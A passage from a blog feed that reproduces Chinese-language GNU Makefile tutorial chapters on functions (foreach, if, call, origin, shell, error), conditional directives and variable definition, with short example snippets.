href="https://seisman.github.io/how-to-write-makefile/functions.html#foreach">¶</a></h2><p>foreach函数和别的函数非常的不一样。因为这个函数是用来做循环用的，Makefile中的foreach函数几乎是仿照于Unix标准Shell（/bin/sh）中的for语句，或是C-Shell（/bin/csh）中的foreach语句而构建的。它的语法是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(foreach &lt;var&gt;,&lt;list&gt;,&lt;text&gt;)</span><br></pre></td></tr></table></figure><p>这个函数的意思是，把参数 <code>&lt;list&gt;</code> 中的单词逐一取出放到参数 <code>&lt;var&gt;</code> 所指定的变量中，然后再执行 <code>&lt;text&gt;</code> 所包含的表达式。每一次 <code>&lt;text&gt;</code> 会返回一个字符串，循环过程中， <code>&lt;text&gt;</code> 的所返回的每个字符串会以空格分隔，最后当整个循环结束时， <code>&lt;text&gt;</code> 所返回的每个字符串所组成的整个字符串（以空格分隔）将会是foreach函数的返回值。</p><p>所以， <code>&lt;var&gt;</code> 最好是一个变量名， <code>&lt;list&gt;</code> 可以是一个表达式，而 <code>&lt;text&gt;</code> 中一般会使用 <code>&lt;var&gt;</code> 这个参数来依次枚举 <code>&lt;list&gt;</code> 中的单词。举个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">names := a b c d</span><br><span class="line"></span><br><span class="line">files := $(foreach n,$(names),$(n).o)</span><br></pre></td></tr></table></figure><p>上面的例子中， <code>$(name)</code> 中的单词会被挨个取出，并存到变量 <code>n</code> 中， <code>$(n).o</code> 每次根据 <code>$(n)</code> 计算出一个值，这些值以空格分隔，最后作为foreach函数的返回，所以， <code>$(files)</code> 的值是 <code>a.o b.o c.o d.o</code> 。</p><p>注意，foreach中的 <code>&lt;var&gt;</code> 参数是一个临时的局部变量，foreach函数执行完后，参数 <code>&lt;var&gt;</code> 的变量将不在作用，其作用域只在foreach函数当中。</p><h2 id="if-函数">if 函数<a href="https://seisman.github.io/how-to-write-makefile/functions.html#if">¶</a></h2><p>if函数很像GNU的make所支持的条件语句——ifeq（参见前面所述的章节），if函数的语法是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(if &lt;condition&gt;,&lt;then-part&gt;)</span><br></pre></td></tr></table></figure><p>或是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(if &lt;condition&gt;,&lt;then-part&gt;,&lt;else-part&gt;)</span><br></pre></td></tr></table></figure><p>可见，if函数可以包含“else”部分，或是不含。即if函数的参数可以是两个，也可以是三个。 <code>&lt;condition&gt;</code> 参数是if的表达式，如果其返回的为非空字符串，那么这个表达式就相当于返回真，于是， <code>&lt;then-part&gt;</code> 会被计算，否则 <code>&lt;else-part&gt;</code> 会被计算。</p><p>而if函数的返回值是，如果 <code>&lt;condition&gt;</code> 为真（非空字符串），那个 <code>&lt;then-part&gt;</code> 会是整个函数的返回值，如果 <code>&lt;condition&gt;</code> 为假（空字符串），那么 <code>&lt;else-part&gt;</code> 会是整个函数的返回值，此时如果 <code>&lt;else-part&gt;</code> 没有被定义，那么，整个函数返回空字串。</p><p>所以， <code>&lt;then-part&gt;</code> 和 <code>&lt;else-part&gt;</code> 只会有一个被计算。</p><h2 id="call函数">call函数<a href="https://seisman.github.io/how-to-write-makefile/functions.html#call">¶</a></h2><p>call函数是唯一一个可以用来创建新的参数化的函数。你可以写一个非常复杂的表达式，这个表达式中，你可以定义许多参数，然后你可以call函数来向这个表达式传递参数。其语法是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(call &lt;expression&gt;,&lt;parm1&gt;,&lt;parm2&gt;,...,&lt;parmn&gt;)</span><br></pre></td></tr></table></figure><p>当make执行这个函数时， <code>&lt;expression&gt;</code> 参数中的变量，如 <code>$(1)</code> 、 <code>$(2)</code> 等，会被参数 <code>&lt;parm1&gt;</code> 、 <code>&lt;parm2&gt;</code> 、 <code>&lt;parm3&gt;</code> 依次取代。而 <code>&lt;expression&gt;</code> 的返回值就是 call 函数的返回值。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reverse =  $(1) $(2)</span><br><span class="line"></span><br><span class="line">foo = $(call reverse,a,b)</span><br></pre></td></tr></table></figure><p>那么， <code>foo</code> 的值就是 <code>a b</code> 。当然，参数的次序是可以自定义的，不一定是顺序的，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reverse =  $(2) $(1)</span><br><span class="line"></span><br><span class="line">foo = $(call reverse,a,b)</span><br></pre></td></tr></table></figure><p>此时的 <code>foo</code> 的值就是 <code>b a</code> 。</p><p>需要注意：在向 call 函数传递参数时要尤其注意空格的使用。call 函数在处理参数时，第2个及其之后的参数中的空格会被保留，因而可能造成一些奇怪的效果。因而在向call函数提供参数时，最安全的做法是去除所有多余的空格。</p><h2 id="origin函数">origin函数<a href="https://seisman.github.io/how-to-write-makefile/functions.html#origin">¶</a></h2><p>origin函数不像其它的函数，他并不操作变量的值，他只是告诉你你的这个变量是哪里来的？其语法是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(origin &lt;variable&gt;)</span><br></pre></td></tr></table></figure><ul><li><p>注意， <code>&lt;variable&gt;</code> 是变量的名字，不应该是引用。所以你最好不要在 <code>&lt;variable&gt;</code> 中使用</p><p><code>$</code> 字符。Origin函数会以其返回值来告诉你这个变量的“出生情况”，下面，是origin函数的返回值:</p></li><li><p><code>undefined</code></p><p>如果 <code>&lt;variable&gt;</code> 从来没有定义过，origin函数返回这个值 <code>undefined</code></p></li><li><p><code>default</code></p><p>如果 <code>&lt;variable&gt;</code> 是一个默认的定义，比如“CC”这个变量，这种变量我们将在后面讲述。</p></li><li><p><code>environment</code></p><p>如果 <code>&lt;variable&gt;</code> 是一个环境变量，并且当Makefile被执行时， <code>-e</code> 参数没有被打开。</p></li><li><p><code>file</code></p><p>如果 <code>&lt;variable&gt;</code> 这个变量被定义在Makefile中。</p></li><li><p><code>command line</code></p><p>如果 <code>&lt;variable&gt;</code> 这个变量是被命令行定义的。</p></li><li><p><code>override</code></p><p>如果 <code>&lt;variable&gt;</code> 是被override指示符重新定义的。</p></li><li><p><code>automatic</code></p><p>如果 <code>&lt;variable&gt;</code> 是一个命令运行中的自动化变量。关于自动化变量将在后面讲述。</p></li></ul><p>这些信息对于我们编写Makefile是非常有用的，例如，假设我们有一个Makefile其包了一个定义文件 Make.def，在 Make.def中定义了一个变量“bletch”，而我们的环境中也有一个环境变量“bletch”，此时，我们想判断一下，如果变量来源于环境，那么我们就把之重定义了，如果来源于Make.def或是命令行等非环境的，那么我们就不重新定义它。于是，在我们的Makefile中，我们可以这样写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ifdef bletch</span><br><span class="line">    ifeq &quot;$(origin bletch)&quot; &quot;environment&quot;</span><br><span class="line">        bletch = barf, gag, etc.</span><br><span class="line">    endif</span><br><span class="line">endif</span><br></pre></td></tr></table></figure><p>当然，你也许会说，使用 <code>override</code> 关键字不就可以重新定义环境中的变量了吗？为什么需要使用这样的步骤？是的，我们用 <code>override</code> 是可以达到这样的效果，可是 <code>override</code> 过于粗暴，它同时会把从命令行定义的变量也覆盖了，而我们只想重新定义环境传来的，而不想重新定义命令行传来的。</p><h2 id="shell函数">shell函数<a href="https://seisman.github.io/how-to-write-makefile/functions.html#shell">¶</a></h2><p>shell函数也不像其它的函数。顾名思义，它的参数应该就是操作系统Shell的命令。它和反引号“`”是相同的功能。这就是说，shell函数把执行操作系统命令后的输出作为函数返回。于是，我们可以用操作系统命令以及字符串处理命令awk，sed等等命令来生成一个变量，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">contents := $(shell cat foo)</span><br><span class="line">files := $(shell echo *.c)</span><br></pre></td></tr></table></figure><p>注意，这个函数会新生成一个Shell程序来执行命令，所以你要注意其运行性能，如果你的Makefile中有一些比较复杂的规则，并大量使用了这个函数，那么对于你的系统性能是有害的。特别是Makefile的隐晦的规则可能会让你的shell函数执行的次数比你想像的多得多。</p><h2 id="控制make的函数">控制make的函数<a href="https://seisman.github.io/how-to-write-makefile/functions.html#make">¶</a></h2><p>make提供了一些函数来控制make的运行。通常，你需要检测一些运行Makefile时的运行时信息，并且根据这些信息来决定，你是让make继续执行，还是停止。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(error &lt;text ...&gt;)</span><br></pre></td></tr></table></figure><p>产生一个致命的错误， <code>&lt;text ...&gt;</code> 是错误信息。注意，error函数不会在一被使用就会产生错误信息，所以如果你把其定义在某个变量中，并在后续的脚本中使用这个变量，那么也是可以的。例如：</p><p>示例一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifdef ERROR_001</span><br><span class="line">    $(error error is $(ERROR_001))</span><br><span class="line">endif</span><br></pre></td></tr></table></figure><p>示例二：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ERR = $(error found an error!)</span><br><span class="line"></span><br><span class="line">.PHONY: err</span><br><span class="line"></span><br><span class="line">err: $(ERR)</span><br></pre></td></tr></table></figure><p>示例一会在变量ERROR_001定义了后执行时产生error调用，而示例二则在目录err被执行时才发生error调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(warning &lt;text ...&gt;)</span><br></pre></td></tr></table></figure><p>这个函数很像error函数，只是它并不会让make退出，只是输出一段警告信息，而make继续执行。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Makefile使用条件判断</title>
      <link href="/2024/04/26/Security/binary/Makefile/5.%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD/"/>
      <url>/2024/04/26/Security/binary/Makefile/5.%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="使用条件判断">使用条件判断<a href="https://seisman.github.io/how-to-write-makefile/conditionals.html#id1">¶</a></h1><p>使用条件判断，可以让make根据运行时的不同情况选择不同的执行分支。条件表达式可以是比较变量的值，或是比较变量和常量的值。</p><h2 id="示例">示例<a href="https://seisman.github.io/how-to-write-makefile/conditionals.html#id2">¶</a></h2><p>下面的例子，判断 <code>$(CC)</code> 变量是否 <code>gcc</code> ，如果是的话，则使用GNU函数编译目标。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">libs_for_gcc = -lgnu</span><br><span class="line">normal_libs =</span><br><span class="line"></span><br><span class="line">foo: $(objects)</span><br><span class="line">ifeq ($(CC),gcc)</span><br><span class="line">    $(CC) -o foo $(objects) $(libs_for_gcc)</span><br><span class="line">else</span><br><span class="line">    $(CC) -o foo $(objects) $(normal_libs)</span><br><span class="line">endif</span><br></pre></td></tr></table></figure><p>可见，在上面示例的这个规则中，目标 <code>foo</code> 可以根据变量 <code>$(CC)</code> 值来选取不同的函数库来编译程序。</p><p>我们可以从上面的示例中看到三个关键字： <code>ifeq</code> 、 <code>else</code> 和 <code>endif</code> 。 <code>ifeq</code> 的意思表示条件语句的开始，并指定一个条件表达式，表达式包含两个参数，以逗号分隔，表达式以圆括号括起。 <code>else</code> 表示条件表达式为假的情况。 <code>endif</code> 表示一个条件语句的结束，任何一个条件表达式都应该以 <code>endif</code> 结束。</p><p>当我们的变量 <code>$(CC)</code> 值是 <code>gcc</code> 时，目标 <code>foo</code> 的规则是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foo: $(objects)</span><br><span class="line">    $(CC) -o foo $(objects) $(libs_for_gcc)</span><br></pre></td></tr></table></figure><p>而当我们的变量 <code>$(CC)</code> 值不是 <code>gcc</code> 时（比如 <code>cc</code> ），目标 <code>foo</code> 的规则是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foo: $(objects)</span><br><span class="line">    $(CC) -o foo $(objects) $(normal_libs)</span><br></pre></td></tr></table></figure><p>当然，我们还可以把上面的那个例子写得更简洁一些：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">libs_for_gcc = -lgnu</span><br><span class="line">normal_libs =</span><br><span class="line"></span><br><span class="line">ifeq ($(CC),gcc)</span><br><span class="line">    libs=$(libs_for_gcc)</span><br><span class="line">else</span><br><span class="line">    libs=$(normal_libs)</span><br><span class="line">endif</span><br><span class="line"></span><br><span class="line">foo: $(objects)</span><br><span class="line">    $(CC) -o foo $(objects) $(libs)</span><br></pre></td></tr></table></figure><h2 id="语法">语法<a href="https://seisman.github.io/how-to-write-makefile/conditionals.html#id3">¶</a></h2><p>条件表达式的语法为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;conditional-directive&gt;</span><br><span class="line">&lt;text-if-true&gt;</span><br><span class="line">endif</span><br></pre></td></tr></table></figure><p>以及:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;conditional-directive&gt;</span><br><span class="line">&lt;text-if-true&gt;</span><br><span class="line">else</span><br><span class="line">&lt;text-if-false&gt;</span><br><span class="line">endif</span><br></pre></td></tr></table></figure><p>其中 <code>&lt;conditional-directive&gt;</code> 表示条件关键字，如 <code>ifeq</code> 。这个关键字有四个。</p><p>第一个是我们前面所见过的 <code>ifeq</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ifeq (&lt;arg1&gt;, &lt;arg2&gt;)</span><br><span class="line">ifeq &#x27;&lt;arg1&gt;&#x27; &#x27;&lt;arg2&gt;&#x27;</span><br><span class="line">ifeq &quot;&lt;arg1&gt;&quot; &quot;&lt;arg2&gt;&quot;</span><br><span class="line">ifeq &quot;&lt;arg1&gt;&quot; &#x27;&lt;arg2&gt;&#x27;</span><br><span class="line">ifeq &#x27;&lt;arg1&gt;&#x27; &quot;&lt;arg2&gt;&quot;</span><br></pre></td></tr></table></figure><p>比较参数 <code>arg1</code> 和 <code>arg2</code> 的值是否相同。当然，参数中我们还可以使用make的函数。如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifeq ($(strip $(foo)),)</span><br><span class="line">&lt;text-if-empty&gt;</span><br><span class="line">endif</span><br></pre></td></tr></table></figure><p>这个示例中使用了 <code>strip</code> 函数，如果这个函数的返回值是空（Empty），那么 <code>&lt;text-if-empty&gt;</code> 就生效。</p><p>第二个条件关键字是 <code>ifneq</code> 。语法是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ifneq (&lt;arg1&gt;, &lt;arg2&gt;)</span><br><span class="line">ifneq &#x27;&lt;arg1&gt;&#x27; &#x27;&lt;arg2&gt;&#x27;</span><br><span class="line">ifneq &quot;&lt;arg1&gt;&quot; &quot;&lt;arg2&gt;&quot;</span><br><span class="line">ifneq &quot;&lt;arg1&gt;&quot; &#x27;&lt;arg2&gt;&#x27;</span><br><span class="line">ifneq &#x27;&lt;arg1&gt;&#x27; &quot;&lt;arg2&gt;&quot;</span><br></pre></td></tr></table></figure><p>其比较参数 <code>arg1</code> 和 <code>arg2</code> 的值是否相同，如果不同，则为真。和 <code>ifeq</code> 类似。</p><p>第三个条件关键字是 <code>ifdef</code> 。语法是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifdef &lt;variable-name&gt;</span><br></pre></td></tr></table></figure><p>如果变量 <code>&lt;variable-name&gt;</code> 的值非空，那到表达式为真。否则，表达式为假。当然， <code>&lt;variable-name&gt;</code> 同样可以是一个函数的返回值。注意， <code>ifdef</code> 只是测试一个变量是否有值，其并不会把变量扩展到当前位置。还是来看两个例子：</p><p>示例一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bar =</span><br><span class="line">foo = $(bar)</span><br><span class="line">ifdef foo</span><br><span class="line">    frobozz = yes</span><br><span class="line">else</span><br><span class="line">    frobozz = no</span><br><span class="line">endif</span><br></pre></td></tr></table></figure><p>示例二：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">foo =</span><br><span class="line">ifdef foo</span><br><span class="line">    frobozz = yes</span><br><span class="line">else</span><br><span class="line">    frobozz = no</span><br><span class="line">endif</span><br></pre></td></tr></table></figure><p>第一个例子中， <code>$(frobozz)</code> 值是 <code>yes</code> ，第二个则是 <code>no</code>。</p><p>第四个条件关键字是 <code>ifndef</code> 。其语法是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifndef &lt;variable-name&gt;</span><br></pre></td></tr></table></figure><p>这个我就不多说了，和 <code>ifdef</code> 是相反的意思。</p><p>在 <code>&lt;conditional-directive&gt;</code> 这一行上，多余的空格是被允许的，但是不能以 <code>Tab</code> 键作为开始（不然就被认为是命令）。而注释符 <code>#</code> 同样也是安全的。 <code>else</code> 和 <code>endif</code> 也一样，只要不是以 <code>Tab</code> 键开始就行了。</p><p>特别注意的是，make是在读取Makefile时就计算条件表达式的值，并根据条件表达式的值来选择语句，所以，你最好不要把自动化变量（如 <code>$@</code> 等）放入条件表达式中，因为自动化变量是在运行时才有的。</p><p>而且为了避免混乱，make不允许把整个条件语句分成两部分放在不同的文件中。</p><p><a href="https://seisman.github.io/how-to-write-makefile/variables.html"> Previous</a><a href="https://seisman.github.io/how-to-write-makefile/functions.html">Next </a></p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Makefile使用变量</title>
      <link href="/2024/04/26/Security/binary/Makefile/4.%E4%BD%BF%E7%94%A8%E5%8F%98%E9%87%8F/"/>
      <url>/2024/04/26/Security/binary/Makefile/4.%E4%BD%BF%E7%94%A8%E5%8F%98%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="使用变量">使用变量<a href="https://seisman.github.io/how-to-write-makefile/variables.html#id1">¶</a></h1><p>在Makefile中的定义的变量，就像是C/C<ins>语言中的宏一样，他代表了一个文本字串，在Makefile中执行的时候其会自动原模原样地展开在所使用的地方。其与C/C</ins>所不同的是，你可以在Makefile中改变其值。在Makefile中，变量可以使用在“目标”，“依赖目标”， “命令”或是Makefile的其它部分中。</p><p>变量的命名字可以包含字符、数字，下划线（可以是数字开头），但不应该含有 <code>:</code> 、 <code>#</code> 、 <code>=</code> 或是空字符（空格、回车等）。变量是大小写敏感的，“foo”、“Foo”和“FOO”是三个不同的变量名。传统的Makefile的变量名是全大写的命名方式，但我推荐使用大小写搭配的变量名，如：MakeFlags。这样可以避免和系统的变量冲突，而发生意外的事情。</p><p>有一些变量是很奇怪字串，如 <code>&lt;</code> 、 <code>@</code> 等，这些是自动化变量，我会在后面介绍。</p><h2 id="变量的基础">变量的基础<a href="https://seisman.github.io/how-to-write-makefile/variables.html#id2">¶</a></h2><p>变量在声明时需要给予初值，而在使用时，需要给在变量名前加上 $ 符号，但最好用小括号 <code>()</code> 或是大括号 <code>&#123;&#125;</code> 把变量给包括起来。如果你要使用真实的 $字符，那么你需要用 $ 来表示。</p><p>变量可以使用在许多地方，如规则中的“目标”、“依赖”、“命令”以及新的变量中。先看一个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">objects = program.o foo.o utils.o</span><br><span class="line">program : $(objects)</span><br><span class="line">    cc -o program $(objects)</span><br><span class="line"></span><br><span class="line">$(objects) : defs.h</span><br></pre></td></tr></table></figure><p>变量会在使用它的地方精确地展开，就像C/C++中的宏一样，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foo = c</span><br><span class="line">prog.o : prog.$(foo)</span><br><span class="line">    $(foo)$(foo) -$(foo) prog.$(foo)</span><br></pre></td></tr></table></figure><p>展开后得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">prog.o : prog.c</span><br><span class="line">    cc -c prog.c</span><br></pre></td></tr></table></figure><p>当然，千万不要在你的Makefile中这样干，这里只是举个例子来表明Makefile中的变量在使用处展开的真实样子。可见其就是一个“替代”的原理。</p><p>另外，给变量加上括号完全是为了更加安全地使用这个变量，在上面的例子中，如果你不想给变量加上括号，那也可以，但我还是强烈建议你给变量加上括号。</p><h2 id="变量中的变量">变量中的变量<a href="https://seisman.github.io/how-to-write-makefile/variables.html#id3">¶</a></h2><p>在定义变量的值时，我们可以使用其它变量来构造变量的值，在Makefile中有两种方式来在用变量定义变量的值。</p><p>先看第一种方式，也就是简单的使用 <code>=</code> 号，在 <code>=</code> 左侧是变量，右侧是变量的值，右侧变量的值可以定义在文件的任何一处，也就是说，右侧中的变量不一定非要是已定义好的值，其也可以使用后面定义的值。如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">foo = $(bar)</span><br><span class="line">bar = $(ugh)</span><br><span class="line">ugh = Huh?</span><br><span class="line"></span><br><span class="line">all:</span><br><span class="line">    echo $(foo)</span><br></pre></td></tr></table></figure><p>我们执行“make all”将会打出变量 <code>(foo)</code> 的值是 <code>Huh?</code> <code>(foo)</code>的值是 <code>(bar)</code> ， <code>(bar)</code> 的值是 <code>(ugh)</code> ， <code>(ugh)</code> 的值是 <code>Huh?</code> 可见，变量是可以使用后面的变量来定义的。</p><p>这个功能有好的地方，也有不好的地方，好的地方是，我们可以把变量的真实值推到后面来定义，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CFLAGS = $(include_dirs) -O</span><br><span class="line">include_dirs = -Ifoo -Ibar</span><br></pre></td></tr></table></figure><p>当 <code>CFLAGS</code> 在命令中被展开时，会是 <code>-Ifoo -Ibar -O</code> 。但这种形式也有不好的地方，那就是递归定义，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CFLAGS = $(CFLAGS) -O</span><br></pre></td></tr></table></figure><p>或：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A = $(B)</span><br><span class="line">B = $(A)</span><br></pre></td></tr></table></figure><p>这会让make陷入无限的变量展开过程中去，当然，我们的make是有能力检测这样的定义，并会报错。还有就是如果在变量中使用函数，那么，这种方式会让我们的make运行时非常慢，更糟糕的是，他会使用得两个make的函数“wildcard”和“shell”发生不可预知的错误。因为你不会知道这两个函数会被调用多少次。</p><p>为了避免上面的这种方法，我们可以使用make中的另一种用变量来定义变量的方法。这种方法使用的是 <code>:=</code> 操作符，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x := foo</span><br><span class="line">y := $(x) bar</span><br><span class="line">x := later</span><br></pre></td></tr></table></figure><p>其等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">y := foo bar</span><br><span class="line">x := later</span><br></pre></td></tr></table></figure><p>值得一提的是，这种方法，前面的变量不能使用后面的变量，只能使用前面已定义好了的变量。如果是这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">y := $(x) bar</span><br><span class="line">x := foo</span><br></pre></td></tr></table></figure><p>那么，y的值是“bar”，而不是“foo bar”。</p><p>上面都是一些比较简单的变量使用了，让我们来看一个复杂的例子，其中包括了make的函数、条件表达式和一个系统变量“MAKELEVEL”的使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ifeq (0,$&#123;MAKELEVEL&#125;)</span><br><span class="line">cur-dir   := $(shell pwd)</span><br><span class="line">whoami    := $(shell whoami)</span><br><span class="line">host-type := $(shell arch)</span><br><span class="line">MAKE := $&#123;MAKE&#125; host-type=$&#123;host-type&#125; whoami=$&#123;whoami&#125;</span><br><span class="line">endif</span><br></pre></td></tr></table></figure><p>关于条件表达式和函数，我们在后面再说，对于系统变量“MAKELEVEL”，其意思是，如果我们的make有一个嵌套执行的动作（参见前面的“嵌套使用make”），那么，这个变量会记录了我们的当前Makefile的调用层数。</p><p>下面再介绍两个定义变量时我们需要知道的，请先看一个例子，如果我们要定义一个变量，其值是一个空格，那么我们可以这样来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nullstring :=</span><br><span class="line">space := $(nullstring) # end of the line</span><br></pre></td></tr></table></figure><p>nullstring是一个Empty变量，其中什么也没有，而我们的space的值是一个空格。因为在操作符的右边是很难描述一个空格的，这里采用的技术很管用，先用一个Empty变量来标明变量的值开始了，而后面采用“#”注释符来表示变量定义的终止，这样，我们可以定义出其值是一个空格的变量。请注意这里关于“#”的使用，注释符“#”的这种特性值得我们注意，如果我们这样定义一个变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir := /foo/bar    # directory to put the frobs in</span><br></pre></td></tr></table></figure><p>dir这个变量的值是“/foo/bar”，后面还跟了4个空格，如果我们这样使用这个变量来指定别的目录——“$(dir)/file”那么就完蛋了。</p><p>还有一个比较有用的操作符是 <code>?=</code> ，先看示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOO ?= bar</span><br></pre></td></tr></table></figure><p>其含义是，如果FOO没有被定义过，那么变量FOO的值就是“bar”，如果FOO先前被定义过，那么这条语将什么也不做，其等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifeq ($(origin FOO), undefined)</span><br><span class="line">    FOO = bar</span><br><span class="line">endif</span><br></pre></td></tr></table></figure><h2 id="变量高级用法">变量高级用法<a href="https://seisman.github.io/how-to-write-makefile/variables.html#id4">¶</a></h2><p>这里介绍两种变量的高级使用方法，第一种是变量值的替换。</p><p>我们可以替换变量中的共有的部分，其格式是 <code>(var:a=b)</code> 或是 <code>&#123;var:a=b&#125;</code> 